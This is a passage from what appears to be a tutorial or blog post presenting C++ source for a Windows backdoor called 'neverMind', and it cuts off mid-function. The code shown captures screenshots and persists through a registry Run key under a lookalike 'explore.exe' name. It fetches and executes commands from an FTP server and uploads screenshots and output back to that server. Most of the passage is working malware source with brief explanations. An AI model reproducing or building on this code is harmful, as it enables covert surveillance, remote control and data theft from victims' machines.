</span></span><span style="display:flex;"><span>    GdiplusShutdown(gdiplusToken);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> full_path;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function initializes GDI+, captures the screen, saves the captured image to memory in JPEG format, writes the image data to a file, and then shuts down GDI+. the file is saved in the directory specified by path and its name is the current date and time. the full path of the file is returned. if the image cannot be saved to memory, an empty string is returned.</p>
<h3 id="ftpc">ftpC</h3>
<p>the <code>ftpC</code> class defined in <code>ftp.h</code> and implemented in <code>ftp.cpp</code> provides a set of functions for FTP operations. the <code>ftpC</code> class uses the WinINet API to perform FTP operations. The <code>m_host</code>, <code>m_username</code>, and <code>m_password</code> member variables store the host, username, and password for the FTP connection. The <code>ftpIO</code> and <code>ftpS</code> member variables are handles to the internet connection and the FTP session, respectively.</p>
<h4 id="constructor--destructor">constructor + destructor</h4>
<p><code>ftpC(const std::string&amp; host, const std::string&amp; username, const std::string&amp; password)</code>: the constructor initializes the FTP connection with the provided host, username, and password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#ff79c6">::</span>ftpC(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> host, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> username, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> password)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> m_host(host), m_username(username), m_password(password), ftpIO(<span style="color:#8be9fd;font-style:italic">NULL</span>), ftpS(<span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>~ftpC()</code>: the destructor cleans up the FTP connection by closing the internet + FTP handles.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#ff79c6">::~</span>ftpC()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpS)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            InternetCloseHandle(ftpS);
</span></span><span style="display:flex;"><span>            ftpS <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpIO)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            InternetCloseHandle(ftpIO);
</span></span><span style="display:flex;"><span>            ftpIO <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="ftp-operations">FTP operations</h4>
<p><code>connect()</code>: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> ftpC<span style="color:#ff79c6">::</span>connect()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        ftpIO <span style="color:#ff79c6">=</span> InternetOpenA(<span style="color:#f1fa8c">&#34;SystemConnection&#34;</span>, INTERNET_OPEN_TYPE_DIRECT, m_host.c_str(), <span style="color:#bd93f9">0</span>, INTERNET_FLAG_CACHE_IF_NET_FAIL);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpIO <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            DWORD error <span style="color:#ff79c6">=</span> GetLastError();
</span></span><span style="display:flex;"><span>            LPVOID lpMsgBuf;
</span></span><span style="display:flex;"><span>            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS, <span style="color:#8be9fd;font-style:italic">NULL</span>, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)<span style="color:#ff79c6">&amp;</span>lpMsgBuf, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string errorMessage <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">static_cast</span><span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">char</span><span style="color:#ff79c6">*&gt;</span>(lpMsgBuf);
</span></span><span style="display:flex;"><span>            LocalFree(lpMsgBuf);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> std<span style="color:#ff79c6">::</span>runtime_error(<span style="color:#f1fa8c">&#34;[!] failed to open connection: &#34;</span> <span style="color:#ff79c6">+</span> errorMessage);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ftpS <span style="color:#ff79c6">=</span> InternetConnectA(ftpIO, m_host.c_str(), INTERNET_DEFAULT_FTP_PORT, m_username.c_str(), m_password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpS <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            DWORD error <span style="color:#ff79c6">=</span> GetLastError();
</span></span><span style="display:flex;"><span>            LPVOID lpMsgBuf;
</span></span><span style="display:flex;"><span>            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS,
</span></span><span style="display:flex;"><span>                          <span style="color:#8be9fd;font-style:italic">NULL</span>, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)<span style="color:#ff79c6">&amp;</span>lpMsgBuf, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string errorMessage <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">static_cast</span><span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">char</span><span style="color:#ff79c6">*&gt;</span>(lpMsgBuf);
</span></span><span style="display:flex;"><span>            LocalFree(lpMsgBuf);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> std<span style="color:#ff79c6">::</span>runtime_error(<span style="color:#f1fa8c">&#34;[!] failed to connect to ftp server: &#34;</span> <span style="color:#ff79c6">+</span> errorMessage);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>upload_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>upload_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> local_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpPutFileA(ftpS, local_path.c_str(), server_name.c_str(), FTP_TRANSFER_TYPE_BINARY, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>retr_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function downloads a file from the FTP server to the local path.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>retr_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> local_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpGetFileA(ftpS, server_name.c_str(), local_path.c_str(), <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_HYPERLINK);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>mkdir(const std::string&amp; folder_name)</code>: this function creates a new directory on the FTP server with the specified folder name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>mkdir(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> folder_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpCreateDirectoryA(ftpS, folder_name.c_str());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>cd(const std::string&amp; server_path)</code>: this function changes the current directory on the FTP server to the directory specified by <code>server_path</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>cd(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpSetCurrentDirectoryA(ftpS, server_path.c_str());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h3 id="nevermind">neverMind</h3>
<p>the <code>neverMind</code> class defined in <code>neverMind.h</code> and implemented in <code>neverMind.cpp</code> provides a set of functions for backdoor operations.</p>
<h4 id="constructor--destructor-1">constructor + destructor</h4>
<p><code>neverMind(const std::string &amp;host, const std::string &amp;username, const std::string &amp;password)</code>: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#ff79c6">::</span>neverMind(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>host, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>username, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>password)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper<span style="color:#ff79c6">::</span>get_username()), store_path(<span style="color:#f1fa8c">&#34;C:</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Users</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> win_username <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">AppData</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Local</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">SystemConnect&#34;</span>), data_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;data&#34;</span>).u8string()), app_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;app&#34;</span>).u8string()), output_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(data_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;output.txt&#34;</span>).u8string())
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>~neverMind()</code>: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#ff79c6">::~</span>neverMind()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="backdoor-operations">backdoor operations</h4>
<p><code>start()</code>: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>start()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>exists(store_path))
</span></span><span style="display:flex;"><span>            setup();
</span></span><span style="display:flex;"><span>        ftp_connection.connect();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(win_username)) {
</span></span><span style="display:flex;"><span>            ftp_connection.mkdir(win_username);
</span></span><span style="display:flex;"><span>            ftp_connection.cd(win_username);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string file_path <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(app_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;cmd.txt&#34;</span>).u8string();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftp_connection.retr_file(file_path, <span style="color:#f1fa8c">&#34;cmd.txt&#34;</span>)) {
</span></span><span style="display:flex;"><span>            Sleep(<span style="color:#bd93f9">1500</span>);
</span></span><span style="display:flex;"><span>            compile(file_path);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ftp_connection.upload_file(output_path, <span style="color:#f1fa8c">&#34;output.txt&#34;</span>);
</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#bd93f9">2000</span>);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>setup()</code>: this function sets up necessary directories and adds the backdoor to the registry for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>setup()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(store_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(data_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(app_path);
</span></span><span style="display:flex;"><span>        add_to_reg();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>add_to_reg()</code>: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command <code>reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \&quot;&quot; + dest + &quot;\&quot;</code> adds a new entry <code>SysConnection</code> to the <code>Run</code> key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>add_to_reg()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        WCHAR path[MAX_PATH];
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> len <span style="color:#ff79c6">=</span> GetModuleFileNameW(<span style="color:#8be9fd;font-style:italic">NULL</span>, path, MAX_PATH);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string new_path;
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string dest <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;explore.exe&#34;</span>).u8string();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> len; <span style="color:#ff79c6">++</span>i)
</span></span><span style="display:flex;"><span>            new_path <span style="color:#ff79c6">+=</span> path[i];
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>copy_file(new_path, dest);
</span></span><span style="display:flex;"><span>        system(std<span style="color:#ff79c6">::</span>string(<span style="color:#f1fa8c">&#34;reg add HKCU</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Software</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Microsoft</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Windows</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">CurrentVersion</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Run /v SysConnection /t REG_SZ /d </span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> dest <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">&#34;</span>).c_str());
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>compile(const std::string &amp;file_path)</code>: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>compile(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string code <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>read_file(file_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>stringstream ss_code(code);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string line;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(ss_code, line))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> spl_line;
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>stringstream ss_line(line);
</span></span><span style="display:flex;"><span>                std<span style="color:#ff79c6">::</span>string command;
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(ss_line, command, <span style="color:#f1fa8c">&#39; &#39;</span>)) {
</span></span><span style="display:flex;"><span>                    spl_line.push_back(command);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                execute(spl_line);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">catch</span> (...) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>execute(const std::vector&lt;std::string&gt;&amp; spl_line)</code>: this function executes the provided commands. it supports several commands like <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>. each command performs a specific operation and writes the result to the output file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>execute(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;&amp;</span> spl_line)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string main_cmd <span style="color:#ff79c6">=</span> spl_line[<span style="color:#bd93f9">0</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;print&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[&gt;] &#34;</span> <span style="color:#ff79c6">+</span> spl_line[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; [&lt;]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;screen&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd">int</span> counter <span style="color:#ff79c6">=</span> std<span style="color:#ff79c6">::</span>stoi(spl_line[<span style="color:#bd93f9">1</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;screens&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    ftp_connection.mkdir(<span style="color:#f1fa8c">&#34;screens&#34;</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.cd(<span style="color:#f1fa8c">&#34;screens&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> counter; <span style="color:#ff79c6">++</span>i)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    std<span style="color:#ff79c6">::</span>string screenshot_path <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>screenshot(data_path);
</span></span><span style="display:flex;"><span>                    Sleep(<span style="color:#bd93f9">500</span>);
</span></span><span style="display:flex;"><span>                    ftp_connection.upload_file(screenshot_path, std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(screenshot_path).filename().u8string());
</span></span><span style="display:flex;"><span>                    Sleep(<span style="color:#bd93f9">1000</span>);
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] screenshots saved &gt;&gt; &#34;</span> <span style="color:#ff79c6">+</span> screenshot_path <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;upload&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">3</span>) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] error [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(<span style="color:#f1fa8c">&#34;uploads&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!] folder not found [!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (ftp_connection.retr_file(spl_line[<span style="color:#bd93f9">2</span>], spl_line[<span style="color:#bd93f9">1</span>]))
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[++] file upload successful [++]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>                    wrapper<span style="color:#ff79c6">::</span>append_file(output_path, <span style="color:#f1fa8c">&#34;[!!] upload error [!!]</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>                ftp_connection.cd(<span style="color:#f1fa8c">&#34;../&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (main_cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;download&#34;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (spl_line.size() <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>) {
